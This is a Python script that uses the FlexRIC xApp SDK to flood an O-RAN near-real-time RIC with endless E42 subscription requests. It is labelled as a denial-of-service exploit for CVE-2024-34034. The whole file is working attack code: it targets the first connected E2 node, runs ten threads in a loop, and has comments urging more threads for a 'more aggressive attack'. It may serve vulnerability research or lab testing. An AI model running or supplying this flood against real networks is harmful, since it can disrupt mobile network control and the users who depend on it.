#!/usr/bin/env python3
import sys
import time
import threading
from concurrent.futures import ThreadPoolExecutor

sys.path.append('/home/oran/flexric/build/examples/xApp/python3/')
import xapp_sdk as ric

# Dummy callback: required by SDK, does nothing
class DummyCallback:
    def handle(self, ind):
        pass

def flood_subscriptions(e2node_id, sm_id, interval, stop_event):
    callback = DummyCallback()
    count = 0
    while not stop_event.is_set():
        try:
            ric.report_sm(e2node_id, sm_id, interval, callback)
            count += 1
        except Exception as e:
            # Optionally print or log errors for debugging
            pass
    return count

def get_service_model_id(sm_name='mac'):
    # Use MAC as default; adjust if needed
    sm_ids = {
        'mac': 142,
        'rlc': 143,
        'pdcp': 144,
        'kpm': 147
    }
    return sm_ids.get(sm_name.lower(), 142)

def main():
    # Initialize xApp (ensure flexric.conf has correct RIC IP)
    ric.init()
    nodes = ric.conn_e2_nodes()
    if not nodes:
        print("No E2 nodes connected. Exiting.")
        ric.try_stop()
        return

    e2node_id = nodes[0].id  # Attack the first available E2 node
    sm_id = get_service_model_id('mac')  # Use MAC SM for attack
    interval = 100  # ms; value is not important for DoS

    print("Starting E42 Subscription DoS flood (CVE-2024-34034)...")
    stop_event = threading.Event()
    thread_count = 10  # Increase for more aggressive attack

    try:
        with ThreadPoolExecutor(max_workers=thread_count) as executor:
            futures = []
            for _ in range(thread_count):
                futures.append(executor.submit(flood_subscriptions, e2node_id, sm_id, interval, stop_event))
            print("Flooding... Press Ctrl+C to stop.")
            while True:
                time.sleep(1)
    except KeyboardInterrupt:
        print("\nStopping attack...")
        stop_event.set()
    finally:
        ric.try_stop()

if __name__ == "__main__":
    main()
